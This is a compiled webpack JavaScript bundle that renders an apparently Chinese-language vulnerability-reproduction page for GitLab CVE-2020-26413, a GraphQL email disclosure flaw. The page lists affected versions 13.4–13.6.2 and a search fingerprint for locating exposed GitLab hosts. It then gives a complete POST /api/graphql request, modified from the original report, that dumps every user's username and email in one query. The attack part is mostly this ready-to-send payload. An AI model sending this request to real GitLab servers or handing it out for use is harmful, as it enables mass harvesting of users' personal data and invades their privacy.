(window.webpackJsonp=window.webpackJsonp||[]).push([[83],{1616:function(t,a,s){t.exports=s.p+"assets/img/gitlab-1.33a33396.png"},1617:function(t,a,s){t.exports=s.p+"assets/img/gitlab-2.3b5fa8a4.png"},1618:function(t,a,s){t.exports=s.p+"assets/img/gitlab-3.aab3e09c.png"},1619:function(t,a,s){t.exports=s.p+"assets/img/gitlab-4.2010a05c.png"},2293:function(t,a,s){"use strict";s.r(a);var r=s(75),e=Object(r.a)({},(function(){var t=this,a=t.$createElement,r=t._self._c||a;return r("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[r("h1",{attrs:{id:"gitlab-graphql邮箱信息泄露漏洞-cve-2020-26413"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#gitlab-graphql邮箱信息泄露漏洞-cve-2020-26413"}},[t._v("#")]),t._v(" GitLab Graphql邮箱信息泄露漏洞 CVE-2020-26413")]),t._v(" "),r("h2",{attrs:{id:"漏洞描述"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),r("p",[t._v("GitLab中存在Graphql接口 输入构造的数据时会泄露用户邮箱和用户名")]),t._v(" "),r("h2",{attrs:{id:"漏洞影响"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),r("a-checkbox",{attrs:{checked:""}},[t._v("GitLab 13.4 - 13.6.2")]),r("br"),t._v(" "),r("h2",{attrs:{id:"网络测绘"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),r("a-checkbox",{attrs:{checked:""}},[t._v('title="GitLab"')]),r("br"),t._v(" "),r("h2",{attrs:{id:"漏洞复现"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),r("p",[t._v("漏洞来源为 hackone上的一篇公开报告")]),t._v(" "),r("a-alert",{attrs:{type:"success",message:"https://gitlab.com/gitlab-org/gitlab/-/issues/244275",description:"",showIcon:""}}),t._v(" "),r("br"),t._v(" "),r("p",[r("img",{attrs:{src:s(1616),alt:"img"}})]),t._v(" "),r("p",[t._v("意思为当使用构造的语句在接口查询时会返回邮箱信息，如图")]),t._v(" "),r("a-alert",{attrs:{type:"success",message:"访问 URL http://xxx.xxx.xxx.xxx/-//graphql-explorer",description:"",showIcon:""}}),t._v(" "),r("br"),t._v(" "),r("p",[r("img",{attrs:{src:s(1617),alt:"img"}})]),t._v(" "),r("p",[t._v("Gitlab本身不允许获取账号邮箱信息，这里通过调用 Graphql 用户名查询造成了邮箱泄露漏洞")]),t._v(" "),r("p",[t._v("查看完报告后发现漏洞利用需要有账号用户名，在不知道的情况下无法获取邮箱，在"),r("a",{attrs:{href:"https://graphql.cn/",target:"_blank",rel:"noopener noreferrer"}},[t._v("Graphql官网"),r("OutboundLink")],1),t._v("查看得知可以通过另一个构造的语句一次性返回所有的用户名和邮箱")]),t._v(" "),r("p",[r("img",{attrs:{src:s(1618),alt:"img"}})]),t._v(" "),r("p",[t._v("发包调用了 "),r("strong",[t._v("/api/graphql")]),t._v(" 接口发送数据")]),t._v(" "),r("p",[t._v("完整数据包为")]),t._v(" "),r("div",{staticClass:"language-json line-numbers-mode"},[r("pre",{pre:!0,attrs:{class:"language-json"}},[r("code",[t._v("POST /api/graphql HTTP/"),r("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.1")]),t._v("\nHost"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" xxx.xxx.xxx.xxx\nContent-Length"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),r("span",{pre:!0,attrs:{class:"token number"}},[t._v("212")]),t._v("\nContent-Type"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" application/json\n\n\n"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),r("span",{pre:!0,attrs:{class:"token property"}},[t._v('"query"')]),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),r("span",{pre:!0,attrs:{class:"token string"}},[t._v('"{\\nusers {\\nedges {\\n  node {\\n    username\\n    email\\n    avatarUrl\\n    status {\\n      emoji\\n      message\\n      messageHtml\\n     }\\n    }\\n   }\\n  }\\n }"')]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),r("span",{pre:!0,attrs:{class:"token property"}},[t._v('"variables"')]),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),r("span",{pre:!0,attrs:{class:"token null keyword"}},[t._v("null")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),r("span",{pre:!0,attrs:{class:"token property"}},[t._v('"operationName"')]),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),r("span",{pre:!0,attrs:{class:"token null keyword"}},[t._v("null")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),r("div",{staticClass:"line-numbers-wrapper"},[r("span",{staticClass:"line-number"},[t._v("1")]),r("br"),r("span",{staticClass:"line-number"},[t._v("2")]),r("br"),r("span",{staticClass:"line-number"},[t._v("3")]),r("br"),r("span",{staticClass:"line-number"},[t._v("4")]),r("br"),r("span",{staticClass:"line-number"},[t._v("5")]),r("br"),r("span",{staticClass:"line-number"},[t._v("6")]),r("br"),r("span",{staticClass:"line-number"},[t._v("7")]),r("br")])]),r("p",[r("img",{attrs:{src:s(1619),alt:"img"}})]),t._v(" "),r("p",[t._v("成功返回数据，造成 Gitlab的用户邮箱信息泄露")])],1)}),[],!1,null,null,null);a.default=e.exports}}]);